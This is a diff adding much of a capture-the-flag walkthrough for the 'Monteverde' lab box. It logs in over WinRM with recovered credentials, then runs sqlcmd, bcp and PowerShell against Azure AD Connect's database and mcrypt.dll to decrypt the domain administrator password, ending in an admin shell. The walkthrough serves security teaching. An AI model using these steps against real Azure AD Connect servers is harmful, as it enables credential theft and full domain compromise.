@@ -436,6 +436,345 @@ kali@kali:~/htb/boxes/monteverde/enum4linux$ cat azure.xml
 </Objs>
 ```
 All right! Looks like we got `mhope`'s credentials. That wasn't so hard was it??? Let's keep going.
+```
+mhope
+4n0therD4y@n0th3r$
+```
 
 ### Shell as mhope
+If you had done an all-ports scan on nmap, you should have seen this port:
+```
+Discovered open port 5985/tcp on 10.10.10.172
+```
+That's the default port for Windows Remote Management - so now that we have `mhope`'s credentials, let's try logging via WinRM using `evil-winrm`:
+```
+kali@kali:~/htb/boxes/monteverde/nmap$ evil-winrm -i monteverde.htb -u mhope -p '4n0therD4y@n0th3r$'
 
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\mhope\Documents>
+```
+Grab user.txt here.
+  
+  
+From here on we could run an enumeration script like `WinPEAS` to find an escalation route, but it's actually pretty straightforward for this box. First we check `mhope`'s privileges with a `net user` command:
+```
+*Evil-WinRM* PS C:\Users\mhope\Desktop> net user mhope
+User name                    mhope
+Full Name                    Mike Hope
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/2/2020 4:40:05 PM
+Password expires             Never
+Password changeable          1/3/2020 4:40:05 PM
+Password required            Yes
+User may change password     No
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory               \\monteverde\users$\mhope
+Last logon                   6/14/2020 7:11:52 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Azure Admins         *Domain Users
+The command completed successfully.
+```
+We see something interesting - `mhope` is part of the `Azure Admins` group. If we Google for privilege escalation techiques related to `Azure Admins`, you [should come across this article](https://blog.xpnsec.com/azuread-connect-for-redteam/), which also contains an exploit POC.
+   
+   
+To sum the article up, to escalate our privleges, the POC basically helps us to do the following steps:
+1. Get the contents of `keyset_id, instance_id, entropy` from `mms_server_configuration`
+2. Store them respectively in the following variables:
+```
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+```
+3. Then, get the contents of `private_configuration_xml, encrypted_configuration` from `mms_management_agent`
+4. Store them respectively in the following variables:
+```
+$config
+$crypted
+```
+5. Do the following:
+```
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+```
+6. Then do the next following:
+```
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+```
+7. After that, print the output:
+```
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+Then basically boom! We'll get the credentials we want. Now we could simply run the script on the box, but you'd soon find that that wouldn't work. The good news is, we can do it manually!
+  
+  
+First we start by manually extracting the contents of `private_configuration_xml, encrypted_configuration`. The article describes how to do that here:
+<img src="https://raw.githubusercontent.com/ongyuann/ongyuann.github.io/master/images/2020-06-14-monteverde-clue.png" alt="say what?" class="inline"/>
+  
+  
+Let's follow the article and enter the directory at `C:\Program Files\Microsoft SQL Server\110\Tools\Binn`:
+```
+*Evil-WinRM* PS C:\Users\mhope\Desktop> cd "C:\Program Files\Microsoft SQL Server\110\Tools\Binn"
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> dir
+
+
+    Directory: C:\Program Files\Microsoft SQL Server\110\Tools\Binn
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         1/2/2020   2:53 PM                Resources
+-a----        8/15/2017   9:31 PM         177856 batchparser.dll
+-a----        8/15/2017   9:31 PM         115392 bcp.exe
+-a----        2/11/2012   9:53 AM         259672 SQLCMD.EXE
+-a----        8/15/2017   9:56 PM         278216 xmlrw.dll
+```
+All right, so we've got the same program `SQLCMD.EXE` as described in the article. If you followed the article, the author actually goes on to mention that the credentials we really want are inside a field called `encrypted_configuration`. Let's see if we can look in those fields:
+```
+sqlcmd.exe -d ADSync -q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+```
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> sqlcmd.exe -d ADSync -q "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+keyset_id   instance_id                          entropy
+----------- ------------------------------------ ------------------------------------
+          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
+```
+Yes, we can - Step 1 completed. Let's do Step 2 and store them in the variables:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key_id = 1
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $instance_id = "1852B527-DD4F-4ECF-B541-EFCCBFF29E31"
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $entropy = "194EC2FC-F186-46CF-B44D-071EB61F49CD"
+```
+Now we've got the first 3 variables. Let's continue with Step 3:
+```
+sqlcmd.exe -d ADSync -q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+```
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> sqlcmd.exe -d ADSync -q "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+private_configuration_xml                                                                                                                                                                                                                                        encrypted_configuration
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+<adma-configuration>
+ <forest-name>MEGABANK.LOCAL</forest-name>
+ <forest-port>0</forest-port>
+ <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
+ <forest-login-user>administrator</forest-login-user>
+ <forest-login-domain>MEGABANK.LOCAL 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g
+
+(1 rows affected)
+```
+Interesting - we nearly got the `administrator`'s encrypted password! But due to some column limitations of `SQLCMD.EXE`, our information is cut short and we can't get the full encrypted password. At this juncture I explored many options available to `SQLCMD.EXE` to try and expand the columns, but those attempts failed. What worked, in the end, was using the `bcp.exe` program.
+
+### bcp.exe to the rescue
+
+What is `bcp.exe`? I don't know. But I [sure as hell learned how to use it](https://social.msdn.microsoft.com/Forums/sqlserver/en-US/0ca4153f-2a16-4bca-8458-874c1bf7e06d/bcp-query-out-format?forum=transactsql). For our case, we can now extract the full contents of `private_configuration_xml` like this:
+```
+bcp.exe "SELECT private_configuration_xml FROM mms_management_agent WHERE ma_type = 'AD'" queryout "C:\users\mhope\documents\out.txt" -d ADSync -T -c
+```
+Notice the `queryout` option -> we need this because the output is going to be too big for our WinRM window. Let's run it:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> bcp.exe "SELECT private_configuration_xml FROM mms_management_agent WHERE ma_type = 'AD'" queryout "C:\users\mhope\documents\out.txt" -d ADSync -T -c
+
+Starting copy...
+
+1 rows copied.
+Network packet size (bytes): 4096
+Clock Time (ms.) Total     : 15     Average : (66.67 rows per sec.)
+```
+Read the output:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> type c:\users\mhope\documents\out.txt
+<adma-configuration>
+ <forest-name>MEGABANK.LOCAL</forest-name>
+ <forest-port>0</forest-port>
+ <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
+ <forest-login-user>administrator</forest-login-user>
+ <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
+ <sign-and-seal>1</sign-and-seal>
+ <ssl-bind crl-check="0">0</ssl-bind>
+ <simple-bind>0</simple-bind>
+ <default-ssl-strength>0</default-ssl-strength>
+ <parameter-values>
+  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
+  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
+  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
+  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
+  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
+  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
+  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
+  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
+  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
+  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
+  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
+  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
+  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
+  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
+  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
+</parameter-values>
+ <password-hash-sync-config>
+            <enabled>1</enabled>
+            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
+         </password-hash-sync-config>
+</adma-configuration>
+```
+Now we do the same for `encrypted_configuration`:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> bcp.exe "SELECT encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'" queryout "C:\users\mhope\documents\out2.txt" -d ADSync -T -c
+
+Starting copy...
+
+1 rows copied.
+Network packet size (bytes): 4096
+Clock Time (ms.) Total     : 1      Average : (1000.00 rows per sec.)
+```
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> type c:\users\mhope\documents\out2.txt
+8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
+```
+Step 3 completed, let's follow through with Step 4 - we can store the contents of the files into the PowerShell variables `$config` and `$crypted` like this:
+```
+$config = [IO.File]::ReadAllText("C:\users\mhope\documents\out.txt")
+$crypted = [IO.File]::ReadAllText("C:\users\mhope\documents\out2.txt")
+```
+So let's do it:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $config = [IO.File]::ReadAllText("C:\users\mhope\documents\out.txt")
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $crypted = [IO.File]::ReadAllText("C:\users\mhope\documents\out2.txt")
+```
+Check `$config`:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $config
+<adma-configuration>
+ <forest-name>MEGABANK.LOCAL</forest-name>
+ <forest-port>0</forest-port>
+ <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
+ <forest-login-user>administrator</forest-login-user>
+ <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
+ <sign-and-seal>1</sign-and-seal>
+ <ssl-bind crl-check="0">0</ssl-bind>
+ <simple-bind>0</simple-bind>
+ <default-ssl-strength>0</default-ssl-strength>
+ <parameter-values>
+  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
+  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
+  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
+  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
+  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
+  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
+  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
+  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
+  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
+  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
+  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
+  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
+  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
+  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
+  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
+  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
+</parameter-values>
+ <password-hash-sync-config>
+            <enabled>1</enabled>
+            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
+         </password-hash-sync-config>
+</adma-configuration>
+```
+Check `$crypted`:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $crypted
+8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
+```
+Step 4 done, let's continue with Step 5:
+```
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+```
+In our WinRM:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.LoadKeySet($entropy, $instance_id, $key_id)
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key = $null
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.GetActiveCredentialKey([ref]$key)
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.GetActiveCredentialKey([ref]$key)
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key2 = $null
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $km.GetKey(1, [ref]$key2)
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $decrypted = $null
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+```
+Now we move on to Step 6:
+```
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+```
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> $password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
+```
+Step 6 completed smoothly, on to the big reveal in Step 7:
+```
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
+In WinRM:
+```
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> Write-Host ("Domain: " + $domain.Domain)
+Domain: MEGABANK.LOCAL
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> Write-Host ("Username: " + $username.Username)
+Username: administrator
+*Evil-WinRM* PS C:\Program Files\Microsoft SQL Server\110\Tools\Binn> Write-Host ("Password: " + $password.Password)
+Password: d0m@in4dminyeah!
+```
+All right! :)
+
+### Priv: Shell as admin
+
+```
+kali@kali:~$ evil-winrm -i monteverde.htb -u administrator -p 'd0m@in4dminyeah!'
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+megabank\administrator
+```
+
+Wasn't that hard, was it?
